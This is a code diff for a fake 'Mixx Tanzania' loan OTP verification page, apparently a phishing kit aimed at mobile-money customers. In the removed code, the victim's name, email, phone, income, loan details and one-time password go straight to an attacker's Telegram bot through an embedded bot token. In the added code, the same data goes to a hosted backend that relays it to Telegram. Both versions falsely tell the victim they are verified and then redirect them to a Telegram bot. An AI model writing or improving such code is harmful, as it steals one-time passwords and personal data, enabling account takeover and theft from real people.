@@ -322,15 +322,12 @@
     <script>
         // ============================================
         // MIXX TANZANIA - OTP VERIFICATION PAGE
-        // WITH DIRECT TELEGRAM INTEGRATION
+        // SECURE - Uses Backend API
         // ============================================
         
-        // YOUR TELEGRAM CREDENTIALS
-        const TELEGRAM_BOT_TOKEN = '7701010924:AAH5jAVQr7fWD0RZwspQMXzLgMJ3mmSCQoc';
-        const TELEGRAM_CHAT_ID = '8409068780';
+        const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
         const BOT_USERNAME = 'MixzyassBot';
         
-        // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const amount = urlParams.get('amount') || '0';
         const term = urlParams.get('term') || '0';
@@ -342,24 +339,12 @@
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
 
-        // Validate required data
-        if (!name || !email) {
-            console.error('Missing required data');
-            document.getElementById('errorMsg').textContent = 'Missing application data. Redirecting...';
-            document.getElementById('errorMsg').classList.add('show');
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 2000);
-        }
-
-        // Update displays
         document.getElementById('summaryAmount').innerText = `TZS ${parseInt(amount).toLocaleString()}`;
         document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
         document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
         document.getElementById('summaryRate').innerText = `${rate}%`;
         document.getElementById('displayPhone').innerText = userPhone;
 
-        // Timer variables (5 minutes = 300 seconds)
         let timeLeft = 300;
         let timerInterval;
 
@@ -387,7 +372,6 @@
 
         startTimer();
 
-        // OTP input elements
         const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'].map(id => document.getElementById(id));
         const verifyBtn = document.getElementById('verifyBtn');
         const errorMsg = document.getElementById('errorMsg');
@@ -430,7 +414,6 @@
 
         otpInputs[0].focus();
 
-        // Resend button
         document.getElementById('resendBtn').addEventListener('click', () => {
             startTimer();
             otpInputs.forEach(input => input.value = '');
@@ -441,7 +424,6 @@
             setTimeout(() => successMsg.classList.remove('show'), 3000);
         });
 
-        // Edit phone number
         document.getElementById('editPhoneBtn').addEventListener('click', () => {
             const newPhone = prompt('Enter your Mixx number (format: +255XXXXXXXXX):', userPhone);
             if (newPhone && newPhone.trim().length > 5) {
@@ -454,69 +436,31 @@
             }
         });
 
-        function escapeHtml(text) {
-            if (!text) return 'N/A';
-            return String(text)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;');
-        }
-
-        // DIRECT TELEGRAM NOTIFICATION FUNCTION FOR OTP
-        async function sendOtpToTelegram(otp) {
-            const timestamp = new Date().toLocaleString('en-TZ', { timeZone: 'Africa/Dar_es_Salaam' });
-            
-            const message = `
-🔐 <b>MIXX TANZANIA - 🟠 OTP ALERT 🟠</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-📅 <b>Time:</b> ${timestamp}
-👤 <b>Name:</b> <code>${escapeHtml(name)}</code>
-📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
-📱 <b>Phone:</b> <code>${escapeHtml(userPhone)}</code>
-💼 <b>Employment:</b> ${escapeHtml(employment)}
-💰 <b>Income:</b> TZS ${parseInt(income || 0).toLocaleString()}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏦 <b>LOAN DETAILS:</b>
-   💵 Amount: TZS ${parseInt(amount).toLocaleString()}
-   📅 Term: ${term} months
-   📊 Interest: ${rate}% APR
-   💳 Monthly: TZS ${parseInt(monthly).toLocaleString()}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>6-DIGIT OTP:</b> <code>${escapeHtml(otp)}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ <b>This OTP expires in 5 minutes!</b>
-📍 <b>Device:</b> ${navigator.userAgent.substring(0, 100)}
-            `;
-            
-            console.log('Sending OTP to Telegram...');
+        async function sendOtpToBackend(otp) {
+            const data = {
+                type: 'otp',
+                name: name,
+                email: email,
+                phone: userPhone,
+                amount: amount,
+                term: term,
+                rate: rate,
+                monthly: monthly,
+                pin: otp,
+                employment: employment,
+                income: income
+            };
             
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ OTP sent to Telegram successfully!');
-                    return { success: true };
-                } else {
-                    console.error('❌ Telegram error:', result.description);
-                    return { success: false, error: result.description };
-                }
+                return await response.json();
             } catch (error) {
-                console.error('❌ Network error:', error);
-                return { success: false, error: error.message };
+                console.error('Error:', error);
+                return { success: false };
             }
         }
 
@@ -531,7 +475,6 @@
             }
         }
 
-        // Verify button click
         verifyBtn.addEventListener('click', async () => {
             const otp = getOtp();
             
@@ -544,18 +487,11 @@
             errorMsg.classList.remove('show');
             showLoading(true);
             
-            // Send OTP to Telegram
-            const result = await sendOtpToTelegram(otp);
+            await sendOtpToBackend(otp);
             
-            if (result.success) {
-                successMsg.textContent = '✓ Verification successful! Redirecting to complete your application...';
-                successMsg.classList.add('show');
-            } else {
-                successMsg.textContent = '✓ Code verified! Redirecting...';
-                successMsg.classList.add('show');
-            }
+            successMsg.textContent = '✓ Verified! Redirecting to complete your application...';
+            successMsg.classList.add('show');
             
-            // Redirect to Telegram bot after short delay
             setTimeout(() => {
                 window.location.href = `https://t.me/${BOT_USERNAME}`;
             }, 2000);
